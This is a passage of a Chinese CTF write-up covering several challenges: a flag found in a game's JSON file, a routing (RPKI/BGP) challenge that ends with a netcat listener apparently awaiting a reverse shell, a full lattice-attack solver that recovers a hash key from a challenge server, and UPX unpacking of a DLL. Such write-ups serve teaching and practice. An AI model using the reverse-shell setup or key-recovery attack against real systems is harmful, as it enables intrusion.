Chief&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Hello, I am the&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Hello, I am the&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Good!&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Good!&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;I know you want to get the flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;I know you want to get the flag&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;宝箱：瞅我干啥，我还能给你变出&quot;</span><span class="punctuation">:</span> <span class="string">&quot;宝箱：瞅我干啥，我还能给你变出&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Why are you&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Why are you&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;The note in the treasure chest&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The note in the treasure chest&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;村长不愧是老北京，就是地道啊。&quot;</span><span class="punctuation">:</span> <span class="string">&quot;村长不愧是老北京，就是地道啊。&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;The village chief is indeed an old&quot;</span><span class="punctuation">:</span> <span class="string">&quot;The village chief is indeed an old&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;he is authentic.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;he is authentic.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;loopholes. It turns out that this&quot;</span><span class="punctuation">:</span> <span class="string">&quot;loopholes. It turns out that this&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;can be reached on the map.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;can be reached on the map.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;the tavern is under the village&quot;</span><span class="punctuation">:</span> <span class="string">&quot;the tavern is under the village&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;’s house!!&quot;</span><span class="punctuation">:</span> <span class="string">&quot;’s house!!&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;here.&quot;</span><span class="punctuation">:</span> <span class="string">&quot;here.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;can really earn money to 0x7f&quot;</span><span class="punctuation">:</span> <span class="string">&quot;can really earn money to 0x7f&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;that&#x27;s the case,&quot;</span><span class="punctuation">:</span> <span class="string">&quot;that&#x27;s the case,&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;&#x27;ll give you a reward!&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&#x27;ll give you a reward!&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;VzNsYzBtM183b19kM19ScEdfVzByMWQ=&quot;</span><span class="punctuation">:</span> <span class="string">&quot;VzNsYzBtM183b19kM19ScEdfVzByMWQ=&quot;</span><span class="punctuation">,</span></span><br><span class="line">    后续省略</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>在其中发现一串完整的base密文串,我们所获取的flag1也在其中,从而推断出其为flag,解密得到flag</p>
<p><img src="./6e32741d-59f5-4671-9bd9-904227a658bb.png" alt="img"></p>
<h2><span id="d3rpki">d3RPKI</span><a href="#d3rpki" class="header-anchor"></a></h2><p>修改配置文件</p>
<p><img src="./8b460b56-a288-442c-913c-7bf1479da19a.png" alt="img"></p>
<p><img src="./751cc258-0dd3-4f2a-b45f-b6aff1be3d74.png" alt="img"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@c839a5a0ff21:~# birdc configure</span><br><span class="line">BIRD 2.14 ready.</span><br><span class="line">Reading configuration from /etc/bird/bird.conf</span><br><span class="line">Reconfigured</span><br><span class="line">root@c839a5a0ff21:~# birdc show protocols </span><br><span class="line">BIRD 2.14 ready.</span><br><span class="line">Name       Proto      Table      State  Since         Info</span><br><span class="line">device1    Device     ---        up     14:54:57.361  </span><br><span class="line">kernel1    Kernel     master4    up     14:54:57.361  </span><br><span class="line">static1    Static     BGP_table  up     14:54:57.361  </span><br><span class="line">rpki1      RPKI       ---        up     14:54:57.364  Established</span><br><span class="line">pipe1      Pipe       ---        up     14:54:57.361  master4 &lt;=&gt; BGP_table</span><br><span class="line">t1         BGP        ---        up     14:55:01.836  Established</span><br></pre></td></tr></table></figure>

<p>nc 等待回连即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@c839a5a0ff21:~# nc -lnvp 1234</span><br></pre></td></tr></table></figure>

<h1><span id="crypto">Crypto</span><a href="#crypto" class="header-anchor"></a></h1><h2><span id="d3fnv">d3fnv</span><a href="#d3fnv" class="header-anchor"></a></h2><ul>
<li>通过服务器选项收集多个（如65个）已知哈希输出 <code>C</code>。</li>
<li>运用三阶段的LLL（及BKZ）格密码攻击：<ul>
<li><strong>第一阶段</strong> : 基于收集的哈希矩阵 <code>C</code> 和素数 <code>p</code> 构造初始格，通过LLL找到与 <code>C</code> 相关的初步线性关系。</li>
<li><strong>第二阶段</strong> : 利用第一阶段的结果，并引入缩放因子，进一步通过LLL提炼信息。</li>
<li><strong>第三阶段 (BKZ与构造格K): 对第二阶段的结果进行BKZ增强规约，得到关键基 。然后构造包含</strong> <strong><code>tar</code></strong> <strong>和</strong> <strong><code>C</code></strong> <strong>的格</strong> <strong><code>K</code>****，通过LLL从中分离出“非线性&#x2F;误差”部分</strong> <strong><code>X</code>****。</strong></li>
</ul>
</li>
</ul>
<p><strong>密钥恢复</strong>:</p>
<ul>
<li>得到 <code>X</code> 和 <code>B_</code> 后，在 <code>GF(p)</code> 域上求解线性方程 <code>A_ * B_ ≡ C - X (mod p)</code>，得到系数列表 。</li>
<li>根据题目特性，在列表中寻找满足特定代数条件的系数 <code>k</code> 即为恢复的密钥（作为 <code>GF(p)</code> 元素）。</li>
</ul>
<p><strong>完成挑战</strong>:</p>
<ul>
<li>使用恢复的密钥（转换为整数形式或直接以 <code>GF(p)</code> 形式，取决于FNV实现细节）和已知的 <code>p</code> (整数形式)，计算服务器最终给出的挑战token的FNV哈希。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote, context</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> matrix, GF, ZZ, identity_matrix, zero_matrix, block_matrix, Matrix</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;CRITICAL&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FNVEquivalentHash</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p_modulus_py_int, key_as_gf_element</span>):</span><br><span class="line">        <span class="variable language_">self</span>.p_val = p_modulus_py_int</span><br><span class="line">        <span class="variable language_">self</span>.key_val = key_as_gf_element</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">H4sh</span>(<span class="params">self, value_str: <span class="built_in">str</span></span>):</span><br><span class="line">        length = <span class="built_in">len</span>(value_str)</span><br><span class="line">        current_x_py_int = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> value_str:</span><br><span class="line">            <span class="keyword">if</span> length == <span class="number">0</span>:</span><br><span class="line">                 <span class="keyword">return</span> <span class="number">0</span> ^ length</span><br><span class="line">            current_x_py_int = (<span class="number">0</span> &lt;&lt; <span class="number">7</span>) % <span class="variable language_">self</span>.p_val</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            current_x_py_int = (<span class="built_in">ord</span>(value_str[<span class="number">0</span>]) &lt;&lt; <span class="number">7</span>) % <span class="variable language_">self</span>.p_val</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> char_c <span class="keyword">in</span> value_str:</span><br><span class="line">            term_in_gf = <span class="variable language_">self</span>.key_val * current_x_py_int</span><br><span class="line">            term_as_py_int = <span class="built_in">int</span>(term_in_gf)</span><br><span class="line">            current_x_py_int = term_as_py_int ^ <span class="built_in">ord</span>(char_c)</span><br><span class="line">        </span><br><span class="line">        current_x_py_int ^= length</span><br><span class="line">        <span class="keyword">return</span> current_x_py_int</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mirrored_attack_logic</span>(<span class="params">param_n, param_m, param_r, modulus_N_py_int, C_matrix_1xm</span>):</span><br><span class="line">    C_matrix_mx1 = C_matrix_1xm.transpose()</span><br><span class="line">    </span><br><span class="line">    Lattice_M_stage1 = block_matrix(ZZ, [</span><br><span class="line">        [modulus_N_py_int * identity_matrix(ZZ, param_r), zero_matrix(ZZ, param_r, param_m)],</span><br><span class="line">        [C_matrix_mx1, identity_matrix(ZZ, param_m)] </span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line">    temp_lll_output = Lattice_M_stage1.LLL()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;... attack_logic: LLL on M_stage1 -&gt; done&quot;</span>) </span><br><span class="line"></span><br><span class="line">    M_matrix_reassigned = Matrix(ZZ, [temp_lll_output[i][param_r:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(param_n + <span class="number">1</span>)]) </span><br><span class="line">    </span><br><span class="line">    Lattice_TempM_stage2 = block_matrix(ZZ, [</span><br><span class="line">        [(<span class="number">2</span>**<span class="number">40</span>) * M_matrix_reassigned.transpose(), identity_matrix(ZZ, param_m)]</span><br><span class="line">    ])</span><br><span class="line">    res_lll_output = Lattice_TempM_stage2.LLL()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;... attack_logic: LLL on TempM_stage2 -&gt; done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    res1_matrix_for_bkz = Matrix(ZZ, [res_lll_output[i][param_n + <span class="number">1</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(param_n)])</span><br><span class="line">    res1_matrix_after_bkz = res1_matrix_for_bkz.BKZ(block_size=<span class="number">20</span>)</span><br><span class="line">    </span><br><span class="line">    tar_basis_matrix = matrix(ZZ, [res1_matrix_after_bkz[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(param_n)]) </span><br><span class="line">    </span><br><span class="line">    Lattice_K_stage3 = block_matrix(ZZ, [</span><br><span class="line">        [tar_basis_matrix, zero_matrix(ZZ, tar_basis_matrix.nrows(), <span class="number">1</span>)], </span><br><span class="line">        [C_matrix_1xm, matrix(ZZ, [[<span class="number">1</span>]])], </span><br><span class="line">        [modulus_N_py_int * identity_matrix(ZZ, param_m), zero_matrix(ZZ, param_m, <span class="number">1</span>)] </span><br><span class="line">    ])</span><br><span class="line">    </span><br><span class="line">    ans_lll_final_output = Lattice_K_stage3.LLL()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;... attack_logic: LLL on K_stage3 -&gt; done&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> vector_i_candidate <span class="keyword">in</span> ans_lll_final_output[param_n : param_n + param_n + <span class="number">2</span>]:</span><br><span class="line">        i_list = vector_i_candidate.<span class="built_in">list</span>()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(i_list[-<span class="number">1</span>]) == <span class="number">1</span>:</span><br><span class="line">            X_solution_flat_list = (vector_i_candidate * i_list[-<span class="number">1</span>]).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">            X_solution_matrix_1xm = matrix(ZZ, [X_solution_flat_list]) </span><br><span class="line">            <span class="keyword">return</span> X_solution_matrix_1xm, tar_basis_matrix</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[WARNING] attack_logic: Solution X not found in final LLL.&quot;</span>) </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main_solver_process</span>():</span><br><span class="line">    target_connection = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target_connection = remote(<span class="string">&#x27;35.241.98.126&#x27;</span>, <span class="number">30924</span>) </span><br><span class="line">        target_connection.recvuntil(<span class="string">b&#x27;option &gt;&#x27;</span>)</span><br><span class="line">        target_connection.sendline(<span class="string">b&#x27;G&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        p_val_py_int = <span class="built_in">int</span>(target_connection.recvline()[<span class="number">4</span>:].decode().strip())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; Received p (Python int): <span class="subst">&#123;<span class="built_in">str</span>(p_val_py_int)[:<span class="number">20</span>]&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">        C_hashes_py_list = []</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Collecting C hashes...&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>): </span><br><span class="line">            target_connection.recvuntil(<span class="string">b&#x27;option &gt;&#x27;</span>)</span><br><span class="line">            target_connection.sendline(<span class="string">b&#x27;H&#x27;</span>)</span><br><span class="line">            C_hashes_py_list.append(<span class="built_in">int</span>(target_connection.recvline()[<span class="number">12</span>:].decode().strip()))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Collected <span class="subst">&#123;<span class="built_in">len</span>(C_hashes_py_list)&#125;</span> hashes.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        C_sage_matrix_1xm = matrix(ZZ, [C_hashes_py_list]) </span><br><span class="line"></span><br><span class="line">        n_param, m_param, r_param = <span class="number">32</span>, <span class="number">65</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Initiating mirrored attack logic...&quot;</span>)</span><br><span class="line">        X_result_matrix, B_prime_basis_matrix = mirrored_attack_logic(</span><br><span class="line">            n_param, m_param, r_param, p_val_py_int, C_sage_matrix_1xm</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> X_result_matrix <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[STOP] Attack logic failed to produce X vector.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; Attack logic successful. Deriving A_coeffs...&quot;</span>)</span><br><span class="line">        current_field_GF_p = GF(p_val_py_int)</span><br><span class="line">        C_minus_X_matrix = C_sage_matrix_1xm - X_result_matrix</span><br><span class="line">        target_for_solve_gf = matrix(current_field_GF_p, C_minus_X_matrix) </span><br><span class="line">        A_coeffs_sage_matrix = B_prime_basis_matrix.solve_left(target_for_solve_gf)</span><br><span class="line"></span><br><span class="line">        Al_outer_list = A_coeffs_sage_matrix.<span class="built_in">list</span>()</span><br><span class="line">        </span><br><span class="line">        actual_Al_coeffs_gf_list = []</span><br><span class="line">        <span class="keyword">if</span> Al_outer_list <span class="keyword">and</span> <span class="built_in">isinstance</span>(Al_outer_list[<span class="number">0</span>], <span class="built_in">list</span>):</span><br><span class="line">            actual_Al_coeffs_gf_list = Al_outer_list[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">elif</span> Al_outer_list: </span><br><span class="line">            actual_Al_coeffs_gf_list = Al_outer_list</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> actual_Al_coeffs_gf_list:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[STOP] Coefficient list Al is empty.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Coefficient list Al (GF(p) elements) obtained, length: <span class="subst">&#123;<span class="built_in">len</span>(actual_Al_coeffs_gf_list)&#125;</span>.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target_connection.recvuntil(<span class="string">b&#x27;option &gt;&#x27;</span>)</span><br><span class="line">        target_connection.sendline(<span class="string">b&#x27;F&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        recovered_key_as_gf_element = <span class="literal">None</span> </span><br><span class="line">        <span class="keyword">for</span> current_coeff_gf <span class="keyword">in</span> actual_Al_coeffs_gf_list: </span><br><span class="line">            term_pow_29 = current_coeff_gf ** <span class="number">29</span> </span><br><span class="line">            neg_term_pow_29 = -term_pow_29</span><br><span class="line">            <span class="keyword">if</span> term_pow_29 <span class="keyword">in</span> actual_Al_coeffs_gf_list <span class="keyword">or</span> neg_term_pow_29 <span class="keyword">in</span> actual_Al_coeffs_gf_list:</span><br><span class="line">                recovered_key_as_gf_element = current_coeff_gf </span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> recovered_key_as_gf_element <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[STOP] Key recovery condition not met from Al list.&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; Candidate key (GF(p) element) recovered: <span class="subst">&#123;recovered_key_as_gf_element&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target_connection.recvuntil(<span class="string">b&#x27;Here is a random token x: &#x27;</span>)</span><br><span class="line">        challenge_token = target_connection.recvline()[:-<span class="number">1</span>].decode() </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; Server token for hashing: <span class="subst">&#123;challenge_token&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        fnv_instance = FNVEquivalentHash(p_val_py_int, recovered_key_as_gf_element)</span><br><span class="line">        computed_hash_py_int = fnv_instance.H4sh(challenge_token)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&gt;&gt;&gt; Computed hash (Python int): <span class="subst">&#123;computed_hash_py_int&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        target_connection.recvuntil(<span class="string">b&#x27;Could you tell the value of H4sh(x)? &#x27;</span>)</span><br><span class="line">        target_connection.sendline(<span class="built_in">str</span>(computed_hash_py_int).encode())</span><br><span class="line"></span><br><span class="line">        server_response_1 = target_connection.recvline().decode().strip()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;&lt;&lt;&lt; Server response line 1: <span class="subst">&#123;server_response_1&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            server_response_2 = target_connection.recvline().decode().strip()</span><br><span class="line">            <span class="keyword">if</span> server_response_2:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">f&quot;&lt;&lt;&lt; Server response line 2: <span class="subst">&#123;server_response_2&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> EOFError: </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;    (Server connection closed after one response line)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e_main:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[FATAL] Main process caught exception: <span class="subst">&#123;<span class="built_in">type</span>(e_main).__name__&#125;</span> - <span class="subst">&#123;e_main&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> target_connection:</span><br><span class="line">            target_connection.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;--- Main process finished ---&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main_solver_process()</span><br></pre></td></tr></table></figure>

<p>运行了几次某一次成功了</p>
<h1><span id="re">Re</span><a href="#re" class="header-anchor"></a></h1><h2><span id="d3rpg-revenge"><strong>d3rpg-revenge</strong></span><a href="#d3rpg-revenge" class="header-anchor"></a></h2><p>010打开secret_dll.dll发现upx壳</p>
<p><img src="./ca284e2d-1fcb-44c4-863f-2e6a4de4d9ee.png" alt="img"></p>
<p>利用fupx脱壳</p>
<p><img src="./e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png" alt="img"></p>
<p>利用ida发现check_flag函数和密文</p>
<p><img src="./e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png" alt="img"></p>
<p>尝试运行,利用ce获取内存dump寻找check_flag调用</p>
<p><img src="./e4e03180-e44e-42fd-a4d4-313d77eeb9cb.png" alt="img"></p>
<p>得到ruby加密代码和密钥</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> <span class="title class_">Scene</span>_RPG</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Secret</span>_Class</span><br><span class="line">    <span class="variable constant_">DELTA</span> = <span class="number">0x1919810</span> |<span class="params"> (($de1ta + 1) * 0xf0000000)</span></span><br><span class="line"><span class="params">    def initialize(new_key)</span></span><br><span class="line"><span class="params">      @key = str_to_longs(new_key)</span></span><br><span class="line"><span class="params">      <span class="keyword">if</span> @key.length &lt; 4</span></span><br><span class="line"><span class="params">        @key.length.upto(4) &#123; </span>|i|<span class="params"> @key[i] = 0 &#125;</span></span><br><span class="line"><span class="params">      <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def <span class="variable language_">self</span>.str_to_longs(s, include_count = <span class="literal">false</span>)</span></span><br><span class="line"><span class="params">      s = s.dup</span></span><br><span class="line"><span class="params">      length = s.length</span></span><br><span class="line"><span class="params">      ((4 - s.length % 4) &amp; 3).times &#123; s &lt;&lt; &quot;\0&quot; &#125;</span></span><br><span class="line"><span class="params">      unpacked = s.unpack(&#x27;V*&#x27;).collect &#123; </span>|n|<span class="params"> int32 n &#125;</span></span><br><span class="line"><span class="params">      unpacked &lt;&lt; length <span class="keyword">if</span> include_count</span></span><br><span class="line"><span class="params">      unpacked</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def str_to_longs(s, include_count = <span class="literal">false</span>)</span></span><br><span class="line"><span class="params">      <span class="variable language_">self</span>.<span class="keyword">class</span>.str_to_longs s, include_count</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def <span class="variable language_">self</span>.longs_to_str(l, count_included = <span class="literal">false</span>)</span></span><br><span class="line"><span class="params">      s = l.pack(&#x27;V*&#x27;)</span></span><br><span class="line"><span class="params">      s = s[0...(l[-1])] <span class="keyword">if</span> count_included</span></span><br><span class="line"><span class="params">      s</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def longs_to_str(l, count_included = <span class="literal">false</span>)</span></span><br><span class="line"><span class="params">      <span class="variable language_">self</span>.<span class="keyword">class</span>.longs_to_str l, count_included</span></span><br><span class="line"><span class="params">    <span class="keyword">end</span></span></span><br><span class="line"><span class="params">    def <span class="variable language_">self</span>.int32(n)</span></span><br><span class="line"><span class="params">      n -= 4_294_967_296 <span class="keyword">while</span> (n &gt;= 